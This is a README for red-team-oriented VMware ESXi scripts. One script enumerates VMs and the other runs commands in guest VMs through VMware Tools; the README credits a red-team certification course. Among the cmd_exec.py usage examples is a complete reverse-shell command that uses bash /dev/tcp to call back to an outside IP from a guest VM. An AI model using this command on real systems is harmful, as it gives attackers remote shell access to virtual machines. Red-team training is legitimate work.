# esxi-scripts
Automation scripts for enumerating the hypervisor environment,

## Requirements
- PyVmomi: `pip install pyVmomi`

## enum-vms.py
Extracts detailed information about all VMs from a vSphere/ESXi host.
Supports both standalone ESXi hosts and vCenter servers.
### Output Formats:
- Text (default): Human-readable format with sections
- CSV: Machine-readable for import into spreadsheets
- JSON: Structured data for automation/APIs

### Features:
- Secure password handling (prompt if not provided)
- Multiple output formats (text, CSV, JSON)
- Filtering capabilities (by name, power state)
- Verbose levels for debugging
- SSL verification toggle
- Connection timeout control
- Summary statistics
- Comprehensive VM information extraction
- Proper resource cleanup
- CSV sanitization (handles commas in data)
- Wildcard filtering support

### Usage:
```bash
# Basic usage with password prompt
python3 enum_vms.py -H 10.5.2.111 -u administrator@company.com

# With password in command (not recommended for security)
python3 enum_vms.py -H 10.5.2.111 -u root -p "Password123"

# Filter VMs and output as CSV
python3 enum_vms.py -H vcenter.company.com -u admin -p "pass" --filter "*prod*" --output csv > vms.csv

# Only powered on VMs with verbose output
python3 enum_vms.py -H esxi01.company.com -u root --state poweredOn -vv

# Disable SSL verification (for self-signed certs)
python3 enum_vms.py -H 10.5.2.111 -u admin -p "pass" --insecure

# Get help
python3 enum_vms.py --help

# Custom port (if not 443)
python3 enum_vms.py -H esxi01:9443 -u root -p "pass" --port 9443
```
## cmd_exec.py
Execute commands on guest VMs via VMware Tools.
Supports both Windows and Linux guests through vSphere API.

> [!IMPORTANT] 
> **Note:** This is a blind Comand Execution.

### Features:
- Interactive password prompts for security
- Multiple command execution from JSON files
- VM listing functionality to find available VMs
- VMware Tools status checking
- Power state verification
- Timeout handling for long-running commands
- Delay between commands for sequential execution
- SSL verification toggle
- Guest OS compatibility (Windows/Linux)
- Working directory specification
- Clean resource management with disconnect
- Environment variable support for passwords
- VM validation before execution attempts

### Usage:
```bash
# List all VMs on a host
python3 cmd_exec.py -H esxi01.company.com -u root -p password --list-vms

# Execute simple command on Linux VM
python3 cmd_exec.py -H esxi01.company.com -u root -p password \
  --vm UbuntuVM --guest-user ubuntu --guest-pass ubuntu \
  --cmd /bin/ls --args "-la /home"

# Execute Windows command (interactive password prompt)
python3 cmd_exec.py -H vcenter.company.com -u administrator@vsphere.local \
  --vm WinServer2019 --guest-user Administrator --cmd "cmd.exe" \
  --args "/c ipconfig /all" --interactive

# 4. Multiple commands from JSON file
python3 cmd_exec.py -H 10.5.2.111 -u root -p Admin123 \
  --vm UbuntuVM --guest-user ubuntu --guest-pass ubuntu \
  --command-file commands.json --output json

# With environment variables and custom timeout
python3 cmd_exec.py -H esxi01.company.com -u root -p password \
  --vm WebServer --guest-user www-data --guest-pass secret \
  --cmd /usr/bin/env --args "" --env PATH=/usr/sbin:/usr/bin \
  --timeout 45 --verbose

# Output as CSV (for automation)
python3 cmd_exec.py -H esxi01.company.com -u root --vm TestVM \
  --guest-user admin --cmd "hostname" --output csv

# Disable SSL verification (for self-signed certs)
python3 cmd_exec.py -H esxi01.company.com -u root -p password --insecure \
  --vm UbuntuVM --guest-user ubuntu --guest-pass ubuntu --cmd "whoami"

# Using environment variables instead of command line passwords
export VSPHERE_PASSWORD="secret"
export GUEST_PASSWORD="guest123"
python3 cmd_exec.py -H esxi01.company.com -u root --vm UbuntuVM \
  --guest-user ubuntu --cmd "id"

# Reverse shell
python3 cmd_exec.py --host 10.5.2.111 --insecure --user 'administrator@company.com' --password 'xxx' --vm 'VaultVM' --guest-user 'ubuntu' --guest-pass 'ubuntu' --cmd '/bin/bash' --args '-c "bash -i >& /dev/tcp/10.10.40.122/443 0>&1"'

# Get help
python3 cmd_exec.py --help
```

## Credits
This is a script modified by me, provided by CyberWarfare Labs in the [Active Directory Red Team Specialist (AD-RTS) certification](https://cyberwarfare.live/product/active-directory-red-team-specialist-ad-rts/).


